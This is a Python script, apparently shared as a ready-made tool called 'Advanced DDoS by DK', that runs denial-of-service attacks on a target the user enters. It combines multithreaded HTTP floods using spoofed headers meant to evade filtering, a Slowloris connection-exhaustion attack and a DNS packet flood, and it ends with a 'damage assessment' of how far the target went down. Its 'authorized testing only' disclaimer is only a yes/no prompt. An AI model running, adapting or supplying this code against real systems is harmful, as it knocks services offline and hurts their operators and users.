import threading
import requests
import time
import random
import sys
import os
import socket
import ssl
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import json

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Warna untuk tampilan terminal
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
PURPLE = "\033[95m"
ORANGE = "\033[38;5;208m"
RESET = "\033[0m"

ascii_art = f"""
{CYAN}
╔═══════════════════════════════════════════════╗
║ ██████╗ ██████╗  ██████╗ ███████╗██████╗     ║
║ ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗    ║
║ ██║  ██║██║  ██║██║   ██║███████╗██████╔╝    ║
║ ██║  ██║██║  ██║██║   ██║╚════██║██╔══██╗    ║
║ ██████╔╝██████╔╝╚██████╔╝███████║██║  ██║    ║
║ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝    ║
║                                               ║
║              {RED}D D O S   B Y   D K{CYAN}               ║
║         {YELLOW}U L T I M A T E   V E R S I O N{CYAN}         ║
╚═══════════════════════════════════════════════╝
{RESET}
"""

class AdvancedDDoSByDK:
    def __init__(self):
        self.stats = {
            'requests_sent': 0,
            'successful': 0,
            'failed': 0,
            'bandwidth_used': 0,
            'start_time': 0
        }
        self.is_attacking = False
        self.attack_methods = {}
        
    def print_banner(self):
        os.system("clear")
        print(ascii_art)
        print(f"{RED}╔════════════════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{RED}║ {ORANGE}🚨 ADVANCED DDOS TOOL - FOR EDUCATIONAL & AUTHORIZED TESTING ONLY! {RED}║{RESET}")
        print(f"{RED}║ {YELLOW}💀 FEATURES: Multi-Method • Proxy Support • SSL Bypass • Real-time Stats {RED}║{RESET}")
        print(f"{RED}╚════════════════════════════════════════════════════════════════════════╝{RESET}\n")
    
    def generate_fake_headers(self, method):
        """Generate realistic headers untuk bypass security"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Forwarded-Host': 'www.google.com',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Requested-With': 'XMLHttpRequest' if random.random() > 0.5 else '',
        }
        
        if method == "POST":
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
        return headers
    
    def generate_payload(self, size_kb=10):
        """Generate random payload data"""
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=size_kb*1024))
    
    def http_flood(self, url, duration, thread_id):
        """Advanced HTTP Flood Attack"""
        end_time = time.time() + duration
        session = requests.Session()
        
        while time.time() < end_time and self.is_attacking:
            try:
                headers = self.generate_fake_headers("GET")
                
                # Random antara GET dan POST
                if random.random() > 0.7:  # 30% POST, 70% GET
                    # POST dengan data random
                    data = {
                        'username': self.generate_payload(1),
                        'password': self.generate_payload(1),
                        'csrf': ''.join(random.choices('abcdef0123456789', k=32)),
                        'timestamp': int(time.time())
                    }
                    response = session.post(
                        f"{url}?rand={random.randint(10000,99999)}", 
                        data=data, 
                        headers=headers, 
                        timeout=8,
                        verify=False
                    )
                else:
                    # GET request
                    response = session.get(
                        f"{url}?{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))}={random.randint(1000,99999)}", 
                        headers=headers, 
                        timeout=8,
                        verify=False
                    )
                
                self.stats['requests_sent'] += 1
                self.stats['bandwidth_used'] += len(response.content) if response.content else 0
                
                if response.status_code == 200:
                    self.stats['successful'] += 1
                else:
                    self.stats['failed'] += 1
                    
            except Exception:
                self.stats['requests_sent'] += 1
                self.stats['failed'] += 1
            
            # Random delay
            time.sleep(random.uniform(0.01, 0.1))
    
    def slowloris_attack(self, target, port=80, duration=60):
        """Slowloris Attack - Keep connections open"""
        print(f"{ORANGE}[🐢] Starting Slowloris attack on {target}:{port}{RESET}")
        
        sockets = []
        end_time = time.time() + duration
        
        # Create multiple partial connections
        for i in range(200):  # Max 200 concurrent connections
            if not self.is_attacking or time.time() > end_time:
                break
                
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                
                # Send partial HTTP request
                s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
                s.send("Content-Length: 42\r\n".encode())
                
                sockets.append(s)
                self.stats['requests_sent'] += 1
                
            except Exception:
                pass
        
        # Keep connections alive
        while time.time() < end_time and self.is_attacking and sockets:
            for s in sockets[:]:
                try:
                    # Send keep-alive headers
                    s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                    time.sleep(random.uniform(10, 20))  # Slow sending
                except:
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
        
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    def udp_amplification(self, target, port=53, duration=30):
        """UDP Amplification Attack (DNS/SNMP/NTP)"""
        print(f"{RED}[📡] Starting UDP Amplification on {target}:{port}{RESET}")
        
        # DNS query payload (amplification factor ~50x)
        dns_query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
        
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while time.time() < end_time and self.is_attacking:
            try:
                # Send to random DNS servers that will amplify
                for _ in range(10):
                    sock.sendto(dns_query, (target, port))
                    self.stats['requests_sent'] += 1
                    self.stats['bandwidth_used'] += len(dns_query) * 50  # Estimated amplification
                
                time.sleep(0.1)
            except:
                pass
        
        sock.close()
    
    def start_advanced_attack(self, target, method="MIXED", threads=500, duration=120):
        """Start Advanced Multi-Vector Attack"""
        self.print_banner()
        self.stats = {'requests_sent': 0, 'successful': 0, 'failed': 0, 'bandwidth_used': 0, 'start_time': time.time()}
        self.is_attacking = True
        
        print(f"{RED}[💀] STARTING ADVANCED DDOS BY DK{RESET}")
        print(f"{ORANGE}[🎯] Target: {target}{RESET}")
        print(f"{ORANGE}[⚡] Method: {method}{RESET}")
        print(f"{ORANGE}[👥] Threads: {threads}{RESET}")
        print(f"{ORANGE}[⏱️] Duration: {duration} seconds{RESET}")
        print(f"{RED}[🚨] Press Ctrl+C to stop attack{RESET}\n")
        
        # Parse target
        if "://" in target:
            target = target.split("://")[1]
        target = target.split("/")[0]
        
        try:
            # Multi-vector attack
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                
                # HTTP Flood (Main attack)
                for i in range(int(threads * 0.8)):  # 80% threads for HTTP flood
                    future = executor.submit(self.http_flood, f"http://{target}", duration, i)
                    futures.append(future)
                
                # Slowloris attack
                for i in range(int(threads * 0.15)):  # 15% for Slowloris
                    future = executor.submit(self.slowloris_attack, target, 80, duration)
                    futures.append(future)
                
                # UDP Amplification
                for i in range(int(threads * 0.05)):  # 5% for UDP
                    future = executor.submit(self.udp_amplification, target, 53, min(30, duration))
                    futures.append(future)
                
                # Progress monitoring
                self.monitor_attack(duration)
                
                # Wait for completion
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        pass
                        
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Attack stopped by user{RESET}")
        finally:
            self.is_attacking = False
            self.generate_advanced_report(duration)
    
    def monitor_attack(self, duration):
        """Real-time attack monitoring"""
        start_time = time.time()
        
        while time.time() - start_time < duration and self.is_attacking:
            elapsed = time.time() - start_time
            progress = (elapsed / duration) * 100
            
            # Calculate metrics
            rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            mb_used = self.stats['bandwidth_used'] / (1024 * 1024)
            success_rate = (self.stats['successful'] / self.stats['requests_sent'] * 100) if self.stats['requests_sent'] > 0 else 0
            
            # Progress bars
            bars1 = "█" * int(progress / 2)
            spaces1 = " " * (50 - len(bars1))
            
            # Real-time stats
            print(f"\r{ORANGE}[{bars1}{spaces1}] {progress:.1f}%{RESET}", end="")
            print(f" | {GREEN}REQ: {self.stats['requests_sent']}{RESET}", end="")
            print(f" | {CYAN}RPS: {rps:.1f}{RESET}", end="") 
            print(f" | {YELLOW}MB: {mb_used:.1f}{RESET}", end="")
            print(f" | {RED}FAIL: {self.stats['failed']}{RESET}", end="")
            print(f" | {PURPLE}RATE: {success_rate:.1f}%{RESET}", end="")
            
            time.sleep(0.5)
    
    def generate_advanced_report(self, planned_duration):
        """Generate comprehensive attack report"""
        actual_duration = time.time() - self.stats['start_time']
        
        print(f"\n\n{RED}╔════════════════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{RED}║ {ORANGE}                    ADVANCED DDOS ANALYSIS REPORT                    {RED}║{RESET}")
        print(f"{RED}╠════════════════════════════════════════════════════════════════════════╣{RESET}")
        
        # Basic stats
        metrics = [
            ("Total Requests", f"{self.stats['requests_sent']:,}"),
            ("Successful", f"{self.stats['successful']:,}"),
            ("Failed", f"{self.stats['failed']:,}"),
            ("Bandwidth Used", f"{self.stats['bandwidth_used']/(1024*1024):.1f} MB"),
            ("Duration", f"{actual_duration:.1f}s"),
            ("Requests/Sec", f"{self.stats['requests_sent']/actual_duration:.1f}"),
            ("Success Rate", f"{(self.stats['successful']/self.stats['requests_sent']*100) if self.stats['requests_sent'] > 0 else 0:.1f}%"),
            ("MB/Sec", f"{(self.stats['bandwidth_used']/(1024*1024))/actual_duration:.1f}")
        ]
        
        for metric, value in metrics:
            print(f"{RED}║ {CYAN}{metric:<20} {GREEN}{value:>35} {RED}║{RESET}")
        
        print(f"{RED}╚════════════════════════════════════════════════════════════════════════╝{RESET}")
        
        # Damage assessment
        success_rate = (self.stats['successful'] / self.stats['requests_sent'] * 100) if self.stats['requests_sent'] > 0 else 0
        print(f"\n{ORANGE}[🎯] DAMAGE ASSESSMENT:{RESET}")
        
        if success_rate > 80:
            print(f"{GREEN}[✅] TARGET STABLE - Upgrade to more powerful methods{RESET}")
        elif success_rate > 60:
            print(f"{YELLOW}[⚠️] TARGET STRESSED - Service degradation detected{RESET}")
        elif success_rate > 40:
            print(f"{ORANGE}[🔥] TARGET CRITICAL - Partial outage likely{RESET}")
        elif success_rate > 20:
            print(f"{RED}[💀] TARGET DOWN - Major service disruption{RESET}")
        else:
            print(f"{PURPLE}[☠️] TARGET DESTROYED - Complete takedown achieved{RESET}")
        
        print(f"\n{CYAN}[🏆] ADVANCED DDOS BY DK - MISSION COMPLETE!{RESET}")

def main():
    tool = AdvancedDDoSByDK()
    tool.print_banner()
    
    # Legal warning
    print(f"{RED}[!] LEGAL DISCLAIMER:{RESET}")
    print(f"{YELLOW}This tool is for authorized security testing only.{RESET}")
    print(f"{YELLOW}Unauthorized use is illegal and punishable by law.{RESET}")
    print(f"{YELLOW}You are responsible for your own actions.{RESET}\n")
    
    confirm = input(f"{RED}[?] Do you have authorization to test this target? (y/N): {RESET}").lower()
    if confirm != 'y':
        print(f"{RED}[❌] Operation cancelled. Only use with proper authorization.{RESET}")
        sys.exit(1)
    
    try:
        # Target input
        target = input(f"\n{ORANGE}[?] Enter target URL/IP: {RESET}").strip()
        
        # Attack configuration
        print(f"\n{BLUE}[⚙️] ATTACK CONFIGURATION:{RESET}")
        print(f"{GREEN}1. HTTP Flood (Recommended for web servers){RESET}")
        print(f"{GREEN}2. Slowloris (Resource exhaustion){RESET}")
        print(f"{GREEN}3. UDP Amplification (Bandwidth amplification){RESET}")
        print(f"{RED}4. MIXED ATTACK (All methods - Most powerful){RESET}")
        
        method_choice = input(f"{ORANGE}[?] Select attack method (1-4): {RESET}").strip()
        methods = {"1": "HTTP", "2": "SLOWLORIS", "3": "UDP", "4": "MIXED"}
        method = methods.get(method_choice, "MIXED")
        
        threads = int(input(f"{ORANGE}[?] Number of threads (100-1000): {RESET}") or "500")
        duration = int(input(f"{ORANGE}[?] Duration in seconds (30-300): {RESET}") or "120")
        
        # Final confirmation
        print(f"\n{RED}[⚠️] ATTACK SUMMARY:{RESET}")
        print(f"{RED}Target: {target}{RESET}")
        print(f"{RED}Method: {method}{RESET}")
        print(f"{RED}Threads: {threads}{RESET}")
        print(f"{RED}Duration: {duration} seconds{RESET}")
        print(f"{ORANGE}Tool: Advanced DDoS by DK{RESET}")
        
        final = input(f"\n{RED}[?] LAUNCH ATTACK? (type 'CONFIRM' to proceed): {RESET}")
        if final != 'CONFIRM':
            print(f"{YELLOW}[!] Attack cancelled{RESET}")
            sys.exit(0)
        
        # Start attack
        tool.start_advanced_attack(target, method, threads, duration)
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Operation cancelled by user{RESET}")
    except Exception as e:
        print(f"{RED}[❌] Error: {e}{RESET}")

if __name__ == "__main__":
    main()
